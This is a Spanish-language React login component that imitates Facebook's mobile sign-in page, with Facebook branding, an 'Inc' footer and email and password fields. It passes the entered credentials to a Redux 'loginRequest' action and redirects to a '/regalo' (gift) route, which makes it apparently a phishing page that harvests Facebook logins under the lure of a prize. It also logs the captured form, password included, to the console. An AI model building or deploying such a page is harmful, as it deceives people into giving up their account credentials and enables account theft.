import React,{useState} from 'react'
import { FaceApp, Form, NavLink, Lenguages, Main,Redirect } from './style'
import { loginRequest } from '../../actions/index'
import { connect } from 'react-redux';


import cell from '../../assets/images/fblogin/celular.png'
import face from '../../assets/images/fblogin/face.svg'



const Logeo = (props) => {

    const [form, setForm] = useState({
        email: '',
        password: '',
        click: false
    
      });
     
      const handleSubmit = (event) => {
       
          event.preventDefault();
          props.loginRequest(form);

        
      };
      const handleChange = (event) =>{

      setForm({
          ...form,
          [event.target.name] : event.target.value,
          click: true
      })
    
      }
      console.log(props)
      console.log(form)

    return (
        <Main>
            <FaceApp>
                <img src={cell} alt="" />
                <span>Descarga Facebook para iPhone y navega más rápido.</span>
            </FaceApp>
            <Form >
                <img src={face} alt="" />
                <input autoComplete="email" type="email" name="email" placeholder="Número de celular o correo electrónico" onChange={handleChange}  />
                <input type="password" name="password" placeholder="Contraseña"  onChange={handleChange}/>
                
                <NavLink onClick={handleSubmit} ready={form.click}><Redirect to="/regalo"> Iniciar Sesion</Redirect></NavLink>
              
            </Form>
            <Lenguages>
                <ul>
                    <li>Español</li>
                    <li>Francais(France)</li>
                    <li>Deutsch</li>
                    <li>العربية</li>
        
                </ul>
                <ul>
                    <li>English (US)</li>
                    <li>Portugués(Brasil)</li>
                    <li>Italiano</li>
                </ul>
            
            </Lenguages>
            <p>Facebook Inc</p>
        </Main>
    )
}

const mapDispatchToProps = {
    loginRequest,
  };
  const mapStateToProps = (state) =>{
    return{
      usuarios: state.usuarios
        
    }
}
export default connect(mapStateToProps,mapDispatchToProps) (Logeo)
